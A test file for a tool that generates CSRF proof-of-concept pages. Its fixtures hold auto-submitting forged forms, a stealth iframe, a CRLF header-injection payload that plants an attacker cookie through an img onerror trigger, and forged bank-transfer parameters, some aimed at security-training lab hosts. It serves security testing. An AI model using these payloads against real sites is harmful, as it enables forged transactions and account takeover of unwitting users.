import { describe, it, expect } from 'vitest';
import { generateHtmlFormPoc } from '../../lib/generator/htmlFormGenerator';
import { ParsedRequest } from '../../types';

describe('HTML Form Generator', () => {
  const req: ParsedRequest = {
    id: 'req-1',
    method: 'POST',
    url: 'https://bank.com/transfer',
    headers: { host: 'bank.com' },
    cookies: { sid: '123' },
    body: 'to=bob&amount=1000',
    contentType: 'application/x-www-form-urlencoded',
    timestamp: Date.now(),
  };

  it('generates auto-submitting form with hidden inputs', () => {
    const poc = generateHtmlFormPoc(req, { autoSubmit: true });

    expect(poc).toContain('action="https://bank.com/transfer"');
    expect(poc).toContain('method="POST"');
    expect(poc).toContain('name="to" value="bob"');
    expect(poc).toContain('name="amount" value="1000"');
    expect(poc).toContain("document.getElementById('csrf_form').submit();");
  });

  it('generates stealth iframe when stealthIframe option is enabled', () => {
    const poc = generateHtmlFormPoc(req, { stealthIframe: true });

    expect(poc).toContain('<iframe name="csrf_forge_stealth_frame"');
    expect(poc).toContain('target="csrf_forge_stealth_frame"');
  });

  it('generates manual submit button when autoSubmit is false', () => {
    const poc = generateHtmlFormPoc(req, { autoSubmit: false, buttonText: 'Confirm Transfer' });

    expect(poc).toContain('Confirm Transfer');
    expect(poc).not.toContain("document.getElementById('csrf_form').submit();");
  });

  it('adds setTimeout when delayMs is configured', () => {
    const poc = generateHtmlFormPoc(req, { autoSubmit: true, delayMs: 2000 });

    expect(poc).toContain('setTimeout(function() {');
    expect(poc).toContain('2000');
  });

  it('injects pre-flight cookie payload with onerror trigger and autoSubmit', () => {
    const poc = generateHtmlFormPoc(req, {
      autoSubmit: true,
      preflight: {
        enabled: true,
        url: 'https://victim.com/?search=test%0d%0aSet-Cookie:%20csrfKey=ATTACKER-KEY; SameSite=None',
        triggerMode: 'onerror',
      },
    });

    expect(poc).toContain('<img src="https://victim.com/?search=test%0d%0aSet-Cookie:%20csrfKey=ATTACKER-KEY; SameSite=None"');
    expect(poc).toContain('onerror="document.getElementById(\'csrf_form\').submit();"');
    // Ensure separate bottom script is not included to avoid race condition
    expect(poc).not.toContain('<script>\n      // Auto-submit on DOM payload execution');
  });

  it('extracts URL when user pastes full <img> tag into preflight', () => {
    const poc = generateHtmlFormPoc(req, {
      autoSubmit: true,
      preflight: {
        enabled: true,
        url: '<img src="https://victim.com/?search=test%0d%0aSet-Cookie:%20csrfKey=MYKEY" onerror="document.forms[0].submit()">',
        triggerMode: 'onerror',
      },
    });

    expect(poc).toContain('<img src="https://victim.com/?search=test%0d%0aSet-Cookie:%20csrfKey=MYKEY"');
    expect(poc).toContain('onerror="document.getElementById(\'csrf_form\').submit();"');
    // Does not have nested <img src="<img src=...
    expect(poc).not.toContain('src="&lt;img');
  });

  it('supports pre-flight with onload and delayMs', () => {
    const poc = generateHtmlFormPoc(req, {
      autoSubmit: true,
      delayMs: 1500,
      preflight: {
        enabled: true,
        url: 'https://victim.com/image.png',
        triggerMode: 'onload',
      },
    });

    expect(poc).toContain('<img src="https://victim.com/image.png"');
    expect(poc).toContain('onload="setTimeout(function() { document.getElementById(\'csrf_form\').submit(); }, 1500);"');
  });

  it('supports pre-flight with fetch mode', () => {
    const poc = generateHtmlFormPoc(req, {
      autoSubmit: true,
      preflight: {
        enabled: true,
        url: 'https://victim.com/api/seed',
        triggerMode: 'fetch',
      },
    });

    expect(poc).toContain('fetch("https://victim.com/api/seed", { mode: \'no-cors\' })');
    expect(poc).toContain("document.getElementById('csrf_form').submit();");
  });

  it('automatically extracts query parameters into hidden inputs for GET requests and cleans action URL', () => {
    const getReq: ParsedRequest = {
      id: 'req-get-1',
      method: 'GET',
      url: 'https://0aa3.web-security-academy.net/my-account/change-email?email=wiener%40normal-user.net&_method=POST',
      headers: { host: '0aa3.web-security-academy.net' },
      cookies: { session: '94sgpXvw' },
      body: '',
      contentType: 'application/x-www-form-urlencoded',
      timestamp: Date.now(),
    };

    const poc = generateHtmlFormPoc(getReq);

    // Form action must be cleaned of query string to comply with browser GET submission spec
    expect(poc).toContain('action="https://0aa3.web-security-academy.net/my-account/change-email"');
    expect(poc).not.toContain('action="https://0aa3.web-security-academy.net/my-account/change-email?');
    expect(poc).toContain('method="GET"');
    // Parameters must be converted to hidden inputs
    expect(poc).toContain('<input type="hidden" name="email" value="wiener@normal-user.net" />');
    expect(poc).toContain('<input type="hidden" name="_method" value="POST" />');
  });

  it('supports custom parameter overrides for GET requests', () => {
    const getReq: ParsedRequest = {
      id: 'req-get-2',
      method: 'GET',
      url: 'https://bank.com/transfer?amount=50&to=alice',
      headers: { host: 'bank.com' },
      cookies: { session: 's1' },
      body: '',
      contentType: 'application/x-www-form-urlencoded',
      timestamp: Date.now(),
    };

    const poc = generateHtmlFormPoc(getReq, {
      customParameters: { amount: '9999', to: 'attacker' },
    });

    expect(poc).toContain('<input type="hidden" name="amount" value="9999" />');
    expect(poc).toContain('<input type="hidden" name="to" value="attacker" />');
  });

  it('generates direct URL redirect PoC when keepQueryInUrl is true for GET requests', () => {
    const getReq: ParsedRequest = {
      id: 'req-get-direct-1',
      method: 'GET',
      url: 'https://0a8b.web-security-academy.net/my-account/change-email?email=wiener3%40normal-user.net&submit=1',
      headers: { host: '0a8b.web-security-academy.net' },
      cookies: { session: 'rUzH4KF4' },
      body: '',
      contentType: 'application/x-www-form-urlencoded',
      timestamp: Date.now(),
    };

    const poc = generateHtmlFormPoc(getReq, { keepQueryInUrl: true });

    // Should NOT contain a <form> element
    expect(poc).not.toContain('<form');
    expect(poc).not.toContain('</form>');
    // Should contain <img src="full-url"> beacon
    expect(poc).toContain('<img src=');
    expect(poc).toContain('change-email?');
    expect(poc).toContain('submit=1');
    // Should contain window.location redirect
    expect(poc).toContain('window.location.href =');
    // Should contain the email param in the URL
    expect(poc).toContain('email=');
  });

  it('falls back to form with hidden inputs when keepQueryInUrl is false (default)', () => {
    const getReq: ParsedRequest = {
      id: 'req-get-form-1',
      method: 'GET',
      url: 'https://bank.com/transfer?amount=50&to=alice',
      headers: { host: 'bank.com' },
      cookies: { session: 's1' },
      body: '',
      contentType: 'application/x-www-form-urlencoded',
      timestamp: Date.now(),
    };

    const poc = generateHtmlFormPoc(getReq, { keepQueryInUrl: false });

    // Should be a standard form
    expect(poc).toContain('<form');
    expect(poc).toContain('<input type="hidden" name="amount" value="50" />');
    expect(poc).not.toContain('window.location.href');
  });

  it('injects _method override parameter into PoC when methodOverride is set', () => {
    const getReq: ParsedRequest = {
      id: 'req-get-override-1',
      method: 'GET',
      url: 'https://victim.com/change-email?email=test%40test.com',
      headers: { host: 'victim.com' },
      cookies: { session: 'abc' },
      body: '',
      contentType: 'application/x-www-form-urlencoded',
      timestamp: Date.now(),
    };

    const poc = generateHtmlFormPoc(getReq, { methodOverride: 'POST' });

    // Should include _method=POST as a hidden input (form mode)
    expect(poc).toContain('name="_method" value="POST"');
  });

  it('injects _method override into direct URL when keepQueryInUrl + methodOverride are both set', () => {
    const getReq: ParsedRequest = {
      id: 'req-get-direct-override',
      method: 'GET',
      url: 'https://victim.com/change-email?email=test%40test.com',
      headers: { host: 'victim.com' },
      cookies: { session: 'abc' },
      body: '',
      contentType: 'application/x-www-form-urlencoded',
      timestamp: Date.now(),
    };

    const poc = generateHtmlFormPoc(getReq, { keepQueryInUrl: true, methodOverride: 'POST' });

    // Direct URL mode — _method should be in the URL, not a hidden input
    expect(poc).not.toContain('<form');
    expect(poc).toContain('_method=POST');
    expect(poc).toContain('window.location.href');
  });
});
